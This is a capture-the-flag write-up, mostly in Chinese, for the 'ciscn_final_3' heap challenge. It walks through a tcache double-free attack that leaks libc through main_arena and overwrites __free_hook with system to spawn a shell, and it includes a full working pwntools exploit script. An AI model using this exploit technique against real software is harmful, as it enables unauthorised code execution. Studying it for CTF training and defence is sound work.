# ciscn_final_3

## 来源
ciscn


## 难度

5 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

环境在glibc 2.27环境下运行, 存在tcache bin管理机制, 只有两个功能, 添加和删除.在添加成功后, 会返回当前堆块的地址, 且添加的大小必须小于0x78, 在tcache 管理机制中, 申请的大小必须>= 0x400才能构成unsoted bin

## vul

```c
unsigned __int64 rm()
{
  __int64 v0; // rax
  unsigned int v2; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "input the index");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &v2);
  if ( v2 > 0x18 )
    exit(0);
  free((void *)qword_2022A0[v2]);               // 指针没有清空, 可以double free
  return __readfsqword(0x28u) ^ v3;
}
```

## 知识点

tcache attack, unsoted bin

## 思路

在堆中找unsoted bin, 在cout开辟的堆就是unsoted bin,使用 tcache attack打入该堆,释放后的到main_arena,再次使用tcache attack打入main_arena + 96处,添加成功后,泄漏出该地址, 又使用tcache attack打入free_hook,修改,为system,重新开辟一个堆存放'/bin/sh'字符串,释放该堆获取shell

## 利用

### leak cout heap buf addr

```python
	# leak cout heap addr
	sh_addr = ad(0, 0x58, '/bin/sh') # 用来为后面做准备的字符串.	
	li('sh_addr ' + hex(sh_addr))
	cout_addr = sh_addr - 0x11c10 # 获取cout 函数开辟的堆地址, 该chunk 为unsorted bin
```

### tcache attack 打入cout heap

```python
	# dub free use teache attack to cout_addr
	ad(1, 0x10, 'A')
	rm(1) # 是fd指向自己
	rm(1)

	ad(2, 0x10, p64(cout_addr)) #创建堆修改自己的 fd 为cout 的heap buffer地址
	ad(3, 0x10, 'A') # for ajust
	ad(4, 0x10, 'B') # malloc chunk to cout_addr
	ad(5, 0x20, 'C') # for teache attack to main_arena
```

### tcache attack 打入main_arena

```python
	ad(5, 0x20, 'C') # for teache attack to main_arena
	# teache attack to 
	rm(4)

	rm(5)
	rm(5)
	
	ad(6, 0x20, p64(cout_addr)) #modify fd-> cout_addr -> main_arena + 98
	ad(7, 0x20, 'A') # -> cout_addr
	ad(8, 0x20, 'B') # -> main_arena
```

### leak libc

```python
	main_arena = ad(9, 0x20, 'CCCC') - 96 # 再次创建堆就会在 main_arena + 96处,从而泄漏该地址
	lib.address = main_arena - 0x3ebc40
	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(lib.address))
```

### tcache attack modify  free_hook as system

```python
# use teache bin attack to modify free_hook
	ad(10, 0x30, 'A')
	rm(10)
	rm(10)

	ad(11, 0x30, p64(lib.sym['__free_hook']))
	ad(12, 0x30, p64(0)) # for ajust
	ad(13, 0x30, p64(lib.sym['system'])) # modify free_hook as system
```

### getshell

```python
# get shell
	rm(0) #释放调用system('/bin/sh')
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'ciscn_final_3'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28452

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(idx, size, data):
	sla('choice > ', str(1))
	sla('index\n', str(idx))
	sla('size\n', str(size))
	sa('something\n', data)
	ru('0x')
	return int(r(12), 16)

def rm(idx):
	sla('choice > ', str(2))
	sla('index\n', str(idx))

def q():
	sla('choice > ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
    # leak cout heap addr
	sh_addr = ad(0, 0x58, '/bin/sh')	
	li('sh_addr ' + hex(sh_addr))
	cout_addr = sh_addr - 0x11c10

	# dub free use teache attack to cout_addr
	ad(1, 0x10, 'A')
	rm(1)
	rm(1)

	ad(2, 0x10, p64(cout_addr)) #modify fd as cout_addr
	ad(3, 0x10, 'A') # for ajust
	ad(4, 0x10, 'B') # malloc chunk to cout_addr
    
	ad(5, 0x20, 'C') # for teache attack to main_arena
	# teache attack to 
	rm(4)

	rm(5)
	rm(5)
	
	ad(6, 0x20, p64(cout_addr)) #modify fd-> cout_addr -> main_arena + 98
	ad(7, 0x20, 'A') # -> cout_addr
	ad(8, 0x20, 'B') # -> main_arena

	# leak libc base

	main_arena = ad(9, 0x20, 'CCCC') - 96
	lib.address = main_arena - 0x3ebc40
	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(lib.address))

	# use teache bin attack to modify free_hook
	ad(10, 0x30, 'A')
	rm(10)
	rm(10)

	ad(11, 0x30, p64(lib.sym['__free_hook']))
	ad(12, 0x30, p64(0)) # for ajust
	ad(13, 0x30, p64(lib.sym['system'])) # modify free_hook as system

	# get shell
	rm(0)

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

